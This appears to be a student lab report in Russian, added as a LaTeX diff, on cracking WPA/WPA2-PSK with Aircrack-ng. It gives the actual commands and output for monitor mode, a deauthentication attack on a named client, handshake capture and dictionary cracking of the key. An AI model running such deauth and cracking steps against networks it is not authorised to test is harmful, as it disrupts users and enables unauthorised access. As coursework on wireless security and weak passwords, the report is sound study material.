@@ -1,0 +1,164 @@
+\section{Цель работы}
+
+Изучить основные возможности пакета AirCrack и принципы взлома WPA/WPA2
+PSK и WEP.
+
+Изучение
+\begin{enumerate}
+	\item Изучить документацию по основным утилитам пакета – airmon-ng, airodump-ng, aireplay-ng, aircrack-ng.
+	\item Запустить режим мониторинга на беспроводном интерфейсе
+	\item Запустить утилиту airodump, изучить формат вывода этой утилиты, форматы файлов, которые она может создавать
+\end{enumerate}
+
+Практическое задание:
+\begin{enumerate}
+	\item Запустить режим мониторинга на беспроводном интерфейсе
+	\item Запустить сбор трафика для получения аутентификационных сообщений
+	\item Если аутентификаций в сети не происходит в разумный промежуток времени, произвести деаутентификацию одного из клиентов, до тех пор, пока не удастся собрать необходимых для взлома аутенти-
+	фикационных сообщений
+	\item Произвести взлом используя словарь паролей
+\end{enumerate}
+
+\section{Ход работы}
+
+\subsection{Основные утилиты пакета Aircrack}
+\begin{itemize}
+	\item Airodump-ng - утилита, предназначенная для захвата пакетов протокола 802.11.
+	\item Aireplay-ng - утилита, для генерации трафика, необходимого для взлома при помощи утилиты aircrack-ng.
+	\item Aircrack-ng - утилита для взлома ключей WEP и WPA при помощи перебора по словарю.
+\end{itemize}
+\subsection{Запуск режима мониторинга на беспроводном интерфейсе}
+\begin{lstlisting}
+bodrik@Bodrik-N53SV:~$ sudo airmon-ng start wlan0
+
+
+Found 5 processes that could cause trouble.
+If airodump-ng, aireplay-ng or airtun-ng stops working after
+a short period of time, you may want to kill (some of) them!
+
+PID	Name
+1202	avahi-daemon
+1203	avahi-daemon
+1600	NetworkManager
+1720	wpa_supplicant
+1928	dhclient
+Process with PID 1928 (dhclient) is running on interface wlan0
+
+
+Interface	Chipset		Driver
+
+wlan0		Atheros 	ath9k - [phy0]
+				(monitor mode enabled on mon0)
+
+bodrik@Bodrik-N53SV:~$ 
+\end{lstlisting}
+\subsection{Запустить утилиту airodump и изучить форматы вывода этой утилиты}
+При указании ключа --write, утилита создает набор файлов с заданным префиксом. Два из которых связаны с информацией о доступных сетях и представлены в двух форматах: csv и xml. Еще два фала содержать информацию о перехваченных пакетах. Файл типа .cap содержит перехваченные пакеты, в то время как csv содержит лишь сокращенную информацию.
+
+\begin{lstlisting}
+bodrik@Bodrik-N53SV:~$ ls dump-03*
+dump-03.cap  dump-03.csv  dump-03.kismet.csv  dump-03.kismet.netxml
+\end{lstlisting}
+\section{Практическое задание}
+Запустим режим мониторинга на беспроводном интерфейсе
+
+\begin{lstlisting}
+bodrik@Bodrik-N53SV:~$ sudo airodump-ng mon0
+\end{lstlisting}
+
+\begin{figure}[H]
+	\centering
+	\includegraphics[width=\textwidth]{images/1.png}
+	\caption{airodump}
+\end{figure}
+
+Нас интересует сеть Nik's.
+
+Запустим сбор трафика для получения аутентификационных сообщений:
+
+\begin{lstlisting}
+bodrik@Bodrik-N53SV:~$ sudo airodump-ng mon0 --write airdump --bssid 28:CF:E9:84:4D:EC
+\end{lstlisting}
+
+\begin{figure}[H]
+	\centering
+	\includegraphics[width=\textwidth]{images/2.png}
+	\caption{airodump}
+\end{figure}
+
+Произведем деаутентификацию одного из клиентов (клиента с MAC-адресом 
+84:8E:DF:59:3B:7E), до тех пор, пока не удастся собрать необходимых для 
+взлома аутентификационных сообщений.
+\begin{lstlisting}
+bodrik@Bodrik-N53SV:~$ sudo aireplay-ng --ignore-negative-one --deauth 150 -a 28:CF:E9:84:4D:EC -h 84:8E:DF:59:3B:7E mon0
+The interface MAC (74:2F:68:1C:56:67) doesn't match the specified MAC (-h).
+	ifconfig mon0 hw ether 84:8E:DF:59:3B:7E
+08:21:03  Waiting for beacon frame (BSSID: 28:CF:E9:84:4D:EC) on channel -1
+NB: this attack is more effective when targeting
+a connected wireless client (-c <client's mac>).
+08:21:04  Sending DeAuth to broadcast -- BSSID: [28:CF:E9:84:4D:EC]
+08:21:04  Sending DeAuth to broadcast -- BSSID: [28:CF:E9:84:4D:EC]
+08:21:05  Sending DeAuth to broadcast -- BSSID: [28:CF:E9:84:4D:EC]
+08:21:05  Sending DeAuth to broadcast -- BSSID: [28:CF:E9:84:4D:EC]
+08:21:05  Sending DeAuth to broadcast -- BSSID: [28:CF:E9:84:4D:EC]
+08:21:06  Sending DeAuth to broadcast -- BSSID: [28:CF:E9:84:4D:EC]
+08:21:06  Sending DeAuth to broadcast -- BSSID: [28:CF:E9:84:4D:EC]
+08:21:07  Sending DeAuth to broadcast -- BSSID: [28:CF:E9:84:4D:EC]
+
+\end{lstlisting}
+В результате перехватываем пакет handshake:
+\begin{lstlisting}
+sudo airodump-ng mon1 --bssid 28:CF:E9:84:4D:EC -c 6 --write dump --ignore-negative-one
+\end{lstlisting}
+
+\begin{figure}[H]
+	\centering
+	\includegraphics[width=\textwidth]{images/3.png}
+	\caption{airodump}
+\end{figure}
+
+Попробуем подобрать пароль, используя полученный пакет с рукопожатием.
+Для того, что бы взлом происходил быстрее, создадим свой словарь паролей 
+(dict.dic).
+\begin{lstlisting}
+bodrik@Bodrik-N53SV:~$ sudo aircrack-ng ./dump-01.cap -w dict.dicOpening ./dump-01.cap
+Opening ./dump-01.cap
+Opening ./dump-01.cap
+Read 9930 packets.
+
+#  BSSID              ESSID                     Encryption
+
+1  28:CF:E9:84:4D:EC  Nik's Wi-Fi Network                   WPA (1 handshake)
+
+Choosing first network as target.
+
+Opening dump-03.cap
+Reading packets, please wait...
+
+Aircrack-ng 1.2 beta3
+
+
+[00:00:00] 1 keys tested (345.36 k/s)
+
+
+Current passphrase: ...                 
+
+KEY FOUND! [ ... ]
+KEY FOUND! [ ... ]
+45 0D 62 F4 FC 81 69 5F D1 1C 65 80 11 8A 1B 0A 
+
+Transient Key  : 05 01 A0 F0 28 F2 D0 99 79 2B 09 94 38 93 04 7A 
+6F C3 75 6C 58 13 7C FB 22 17 99 00 8A 99 79 77 
+B9 10 1C 39 DE 5C 0C 29 C5 1C 43 39 B2 06 F5 7B 
+EAPOL HMAC     : E9 D0 1B 6C F3 ED A4 F6 FC 83 5D BC 3C 6A 9F 00 
+
+\end{lstlisting}
+В результате видим сообщение об успешно подобранном пароле, а так же сам пароль.
+
+\section{Выводы}
+В ходе данной работы были изучены основные возможности пакета AirCrack и 
+принципы взлома WPA2 в режиме PSK. %
+Данный инструмент позволяет прослушивать пакеты в беспроводной, генерировать новые, а так же осуществлять взлом пароля сети при помощи перебора по 
+словарю.
+
+В ходе работы было выяснено, что использование общеупотребимых (словарных) паролей значительно облегчает взлом беспроводной сети.
